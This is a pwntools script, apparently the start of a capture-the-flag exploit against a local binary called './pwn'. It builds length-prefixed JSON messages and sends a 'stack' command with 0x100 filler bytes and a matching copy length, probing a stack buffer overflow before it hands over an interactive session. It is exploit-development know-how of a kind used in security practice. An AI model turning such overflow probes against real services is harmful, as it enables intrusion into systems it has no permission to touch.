from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-l 100']
context.log_level = 'debug'
file_name = './pwn'
ld_name = './ld-linux-x86-64.so.2'
io = process([ld_name, '--library-path', '.', file_name])
libc = ELF('./libc.so.6')
elf = ELF(file_name)
pr = lambda x:success('\x1b[01;38;5;214m'+hex(x)+'\x1b[0m')
sl = lambda x:io.sendline(x)
s  = lambda x:io.send(x) 
rt = lambda x:io.recvuntil(x)
ri = lambda x:int(io.recv(x),16)
ru = lambda x:u64(io.recv(x).ljust(8,b'\x00'))
it = lambda  :io.interactive()
sp = lambda  :sleep(1.5)
q  = lambda  :sleep(0.2)

def re_data(data):
    if type(data) == str:
        data = data.encode()
    pd = b'"'
    for i in data:
        if i == 0x22:
            pd += b'\\"'
        elif i == 0x5c:
            pd += b'\\\\'
        elif i == 0x0a:
            pd += b'\\n'
        elif i == 0x0d:
            pd += b'\\r'
        elif i == 0x09:
            pd += b'\\t'
        elif 0x20 <= i <= 0x7e:
            pd += bytes([i])
        else:
            raise ValueError(f'bad byte: {hex(i)}')
    pd += b'"'
    return pd

def re_cjson(choice,data,length):
    pd = b'{'+b'"cmd":'+re_data(choice)+b',"data":'+re_data(data)+b',"copy_len":'+str(length).encode()+b'}'
    return pd
#gdb.attach(io,"b *0x401360")
pay = re_cjson("stack",b'a'*0x100,0x100)
io.send(p32(len(pay)))
io.send(pay)
it()
